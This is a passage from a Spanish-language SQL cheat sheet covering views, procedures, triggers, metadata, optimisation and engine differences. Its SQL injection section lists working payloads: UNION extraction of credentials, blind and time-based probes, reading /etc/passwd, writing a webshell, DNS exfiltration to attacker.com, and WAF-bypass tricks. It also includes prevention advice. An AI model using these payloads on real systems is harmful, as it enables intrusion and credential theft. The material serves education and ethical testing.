SELECT e.id, e.nombre, e.apellido, e.email, e.salario, d.nombre AS departamento
FROM empleados e
INNER JOIN departamentos d ON e.depto_id = d.id
WHERE e.activo = TRUE;

-- Usar la vista como tabla normal
SELECT * FROM vista_empleados_activos WHERE salario > 50000;

-- Vista actualizable (condiciones para ser actualizable: sin GROUP BY, DISTINCT, funciones de agregación, JOIN en algunas BD)
CREATE OR REPLACE VIEW vista_salarios AS
SELECT id, nombre, salario FROM empleados;

UPDATE vista_salarios SET salario = 60000 WHERE id = 1;  -- Actualiza la tabla base

-- Vista con CHECK OPTION (garantiza que los datos insertados/actualizados cumplen el WHERE)
CREATE VIEW vista_it AS
SELECT * FROM empleados WHERE depto_id = 1
WITH CHECK OPTION;  -- Error si intentas insertar con depto_id != 1

-- Eliminar vista
DROP VIEW vista_empleados_activos;
DROP VIEW IF EXISTS vista_empleados_activos;

-- Vistas materializadas (PostgreSQL — guarda el resultado físicamente)
CREATE MATERIALIZED VIEW mv_resumen_deptos AS
SELECT depto_id, COUNT(*) AS total, AVG(salario) AS avg_salario
FROM empleados GROUP BY depto_id;

REFRESH MATERIALIZED VIEW mv_resumen_deptos;  -- Actualizar datos
```

### Procedimientos Almacenados

```sql
-- MySQL
DELIMITER //
CREATE PROCEDURE subir_salario(
    IN p_depto_id INT,
    IN p_porcentaje DECIMAL(5,2),
    OUT p_empleados_afectados INT
)
BEGIN
    DECLARE v_count INT DEFAULT 0;

    START TRANSACTION;

    UPDATE empleados
    SET salario = salario * (1 + p_porcentaje / 100)
    WHERE depto_id = p_depto_id AND activo = TRUE;

    SET v_count = ROW_COUNT();
    SET p_empleados_afectados = v_count;

    COMMIT;

    SELECT CONCAT('Actualizados: ', v_count, ' empleados') AS resultado;
END //
DELIMITER ;

-- Llamar al procedimiento
CALL subir_salario(1, 10, @afectados);
SELECT @afectados;

-- Eliminar procedimiento
DROP PROCEDURE IF EXISTS subir_salario;

-- PostgreSQL
CREATE OR REPLACE FUNCTION subir_salario(p_depto_id INT, p_porcentaje DECIMAL)
RETURNS TABLE(nombre VARCHAR, salario_nuevo DECIMAL) AS $$
BEGIN
    RETURN QUERY
    UPDATE empleados
    SET salario = salario * (1 + p_porcentaje / 100)
    WHERE depto_id = p_depto_id
    RETURNING nombre, salario;
END;
$$ LANGUAGE plpgsql;

SELECT * FROM subir_salario(1, 10);
```

### Triggers

```sql
-- MySQL: auditar cambios de salario
CREATE TABLE auditoria_salarios (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    empleado_id INT,
    salario_ant DECIMAL(10,2),
    salario_nue DECIMAL(10,2),
    modificado_por VARCHAR(100),
    modificado_en TIMESTAMP DEFAULT NOW()
);

DELIMITER //
CREATE TRIGGER tr_after_update_salario
AFTER UPDATE ON empleados
FOR EACH ROW
BEGIN
    IF OLD.salario <> NEW.salario THEN
        INSERT INTO auditoria_salarios
            (empleado_id, salario_ant, salario_nue, modificado_por)
        VALUES
            (NEW.id, OLD.salario, NEW.salario, USER());
    END IF;
END //
DELIMITER ;

-- Trigger BEFORE INSERT para validación
DELIMITER //
CREATE TRIGGER tr_before_insert_empleado
BEFORE INSERT ON empleados
FOR EACH ROW
BEGIN
    IF NEW.salario < 0 THEN
        SIGNAL SQLSTATE '45000'
        SET MESSAGE_TEXT = 'El salario no puede ser negativo';
    END IF;
    SET NEW.email = LOWER(NEW.email);  -- Normalizar email a minúsculas
END //
DELIMITER ;

-- Ver triggers
SHOW TRIGGERS;
SHOW TRIGGERS FROM empresa;
SELECT * FROM information_schema.TRIGGERS WHERE TRIGGER_SCHEMA = 'empresa';

-- Eliminar trigger
DROP TRIGGER tr_after_update_salario;
```

---

## 9. Consultas de Metadatos

```sql
-- MySQL: información del esquema
SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'empresa';
SELECT * FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'empresa' AND TABLE_NAME = 'empleados';
SELECT * FROM information_schema.KEY_COLUMN_USAGE WHERE REFERENCED_TABLE_NAME IS NOT NULL;
SELECT * FROM information_schema.USER_PRIVILEGES;
SELECT * FROM information_schema.SCHEMA_PRIVILEGES;

-- Ver tablas y sus tamaños (MySQL)
SELECT TABLE_NAME,
       ROUND(DATA_LENGTH / 1024 / 1024, 2) AS datos_MB,
       ROUND(INDEX_LENGTH / 1024 / 1024, 2) AS indices_MB,
       TABLE_ROWS AS filas_aprox
FROM information_schema.TABLES
WHERE TABLE_SCHEMA = 'empresa'
ORDER BY DATA_LENGTH DESC;

-- Comandos rápidos MySQL
SHOW DATABASES;
USE empresa;
SHOW TABLES;
DESCRIBE empleados;         -- Estructura de la tabla
SHOW CREATE TABLE empleados;  -- DDL completo de la tabla
SHOW PROCESSLIST;           -- Procesos activos (conexiones)
SHOW STATUS;                -- Estado del servidor
SHOW VARIABLES LIKE '%max%';  -- Variables de configuración
SHOW GRANTS FOR 'alice'@'localhost';

-- PostgreSQL
\l                          -- Listar bases de datos
\c empresa                  -- Conectar a base de datos
\dt                         -- Listar tablas
\d empleados                -- Estructura de tabla
\di                         -- Listar índices
\dv                         -- Listar vistas
\dp                         -- Permisos de objetos
\du                         -- Listar usuarios/roles
\df                         -- Listar funciones

SELECT current_database();
SELECT version();
SELECT * FROM pg_tables WHERE schemaname = 'public';
SELECT * FROM pg_indexes WHERE tablename = 'empleados';
SELECT * FROM information_schema.columns WHERE table_name = 'empleados';
```

---

## 10. Optimización y EXPLAIN

```sql
-- EXPLAIN / EXPLAIN ANALYZE
EXPLAIN SELECT * FROM empleados WHERE salario > 50000;
EXPLAIN ANALYZE SELECT * FROM empleados WHERE salario > 50000;  -- Ejecuta y muestra tiempo real
EXPLAIN FORMAT=JSON SELECT * FROM empleados JOIN departamentos ON empleados.depto_id = departamentos.id;

-- Qué buscar en EXPLAIN:
-- type: ALL (full scan, MALO) → range, ref, eq_ref, const (bueno)
-- key: NULL (no usa índice) → nombre del índice (bueno)
-- rows: número de filas examinadas (menos es mejor)
-- Extra: "Using filesort" (mal), "Using index" (bien, cubierto)

-- Forzar uso de índice
SELECT * FROM empleados USE INDEX (idx_salario) WHERE salario > 50000;
SELECT * FROM empleados FORCE INDEX (idx_salario) WHERE salario > 50000;
SELECT * FROM empleados IGNORE INDEX (idx_salario) WHERE salario > 50000;

-- Estadísticas de tablas
ANALYZE TABLE empleados;           -- Actualiza estadísticas para el optimizador (MySQL)
ANALYZE empleados;                 -- PostgreSQL
VACUUM ANALYZE empleados;          -- PostgreSQL: limpia y actualiza estadísticas

-- Optimizar tabla (reconstruir, desfragmentar)
OPTIMIZE TABLE empleados;          -- MySQL
VACUUM FULL empleados;             -- PostgreSQL

-- Ver queries lentas (MySQL)
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL long_query_time = 1;    -- Queries que tarden más de 1 segundo
SHOW VARIABLES LIKE '%slow%';
```

---

## 11. SQL Injection — Ataques y Prevención

> **Esta sección es para propósitos educativos y de pentesting ético.**

### Tipos de SQL Injection

**In-band SQLi**: El resultado se ve directamente en la respuesta.

```sql
-- Error-based: fuerza un error que revela información
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) -- -
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- -

-- Union-based: inyecta un UNION SELECT para extraer datos
' ORDER BY 1-- -              -- Determinar número de columnas
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Con 3 columnas:
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,user(),3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- -
```

**Blind SQLi**: No hay output visible, hay que inferir por comportamiento.

```sql
-- Boolean-based: verdadero/falso cambia la respuesta
' AND 1=1-- -              -- Verdadero: respuesta normal
' AND 1=2-- -              -- Falso: respuesta diferente
' AND (SELECT SUBSTRING(version(),1,1))='8'-- -  -- ¿Primera letra de versión es '8'?
' AND LENGTH(database())=6-- -   -- ¿La BD tiene 6 caracteres?

-- Time-based: infiere por el tiempo de respuesta
' AND SLEEP(5)-- -                    -- MySQL: espera 5 segundos si es vulnerable
'; WAITFOR DELAY '0:0:5'-- -          -- SQL Server
' AND pg_sleep(5)-- -                 -- PostgreSQL
' AND (SELECT 1 FROM (SELECT SLEEP(5)) t WHERE (SELECT SUBSTRING(user(),1,1))='r')-- -
```

**Out-of-band SQLi**: Exfiltra datos por DNS/HTTP.

```sql
-- MySQL (requiere FILE privilege)
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3-- -         -- Leer archivos
' INTO OUTFILE '/var/www/html/shell.php'-- -              -- Escribir webshell

-- DNS exfiltration (si LOAD_FILE está habilitado)
' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share'))-- -
```

### Bypass de WAF y filtros

```sql
-- Comentarios alternativos
--      -- Estándar SQL
#       -- MySQL
/*!*/   -- MySQL conditional comment
/**/    -- Inline comment (para romper palabras)

-- Bypass de filtros de espacios
SELECT/**/username/**/FROM/**/users
SEL+ECT username FROM users        -- Algunos WAF
SELECT%09username%09FROM%09users   -- Tab en lugar de espacio
SELECT%0Ausername%0AFROM%0Ausers   -- Newline

-- Bypass de filtros de palabras
UNION → UNION ALL, uNiOn, /*!UNION*/
SELECT → /*!50000SELECT*/, %53ELECT
OR → ||, OR 1 LIKE 1, OR 1<2
AND → &&, AND 1 LIKE 1

-- Encoding
0x61646d696e                      -- Hex encoding de 'admin'
CHAR(65,68,77,73,78)              -- CHAR() encoding
```

### Prevención

```sql
-- ✓ SIEMPRE: usar consultas preparadas (prepared statements)
-- PHP (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
$stmt->execute([$email, $password]);

-- Python (mysql-connector)
cursor.execute("SELECT * FROM users WHERE email = %s AND password = %s", (email, password))

-- Java (JDBC)
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE email = ? AND password = ?");
stmt.setString(1, email);
stmt.setString(2, password);

-- ✓ Validación y saneamiento de input
-- ✓ Principio de mínimo privilegio: usuarios DB con solo los permisos necesarios
-- ✓ WAF como segunda línea de defensa (no como única)
-- ✓ Manejo de errores: nunca mostrar errores de BD al usuario
-- ✓ Auditoría y logging de queries anómalas
```

---

## 12. Diferencias entre Motores

| Característica | MySQL | PostgreSQL | SQLite | SQL Server |
|---|---|---|---|---|
| Autoincremento | `AUTO_INCREMENT` | `SERIAL` / `GENERATED ALWAYS AS IDENTITY` | `INTEGER PRIMARY KEY` | `IDENTITY(1,1)` |
| String concat | `CONCAT()` | `\|\|` o `CONCAT()` | `\|\|` | `+` |
| Límite de filas | `LIMIT n` | `LIMIT n` | `LIMIT n` | `TOP n` |
| Página actual | `LIMIT n OFFSET m` | `LIMIT n OFFSET m` | `LIMIT n OFFSET m` | `OFFSET m ROWS FETCH NEXT n ROWS ONLY` |
| Fecha actual | `NOW()` | `NOW()` | `datetime('now')` | `GETDATE()` |
| Diferencia fechas | `DATEDIFF()` | `AGE()` / `-` | `julianday()` | `DATEDIFF()` |
| Formato fecha | `DATE_FORMAT()` | `TO_CHAR()` | `strftime()` | `FORMAT()` |
| IF condicional | `IF(cond, a, b)` | No (usar CASE) | `IIF()` | `IIF()` |
| Regex | `REGEXP` | `~` o `SIMILAR TO` | `REGEXP` (extensión) | `LIKE` (limitado) |
| Transacciones | Sí (InnoDB) | Sí | Sí | Sí |
| JSON nativo | Sí (5.7+) | Sí (muy completo) | No | Sí (2016+) |
| Window functions | Sí (8.0+) | Sí (completo) | Sí (3.25+) | Sí |
| CTEs recursivas | Sí (8.0+) | Sí | Sí (3.35+) | Sí |
| Full-text search | Sí | Sí (muy completo) | Limitado | Sí |
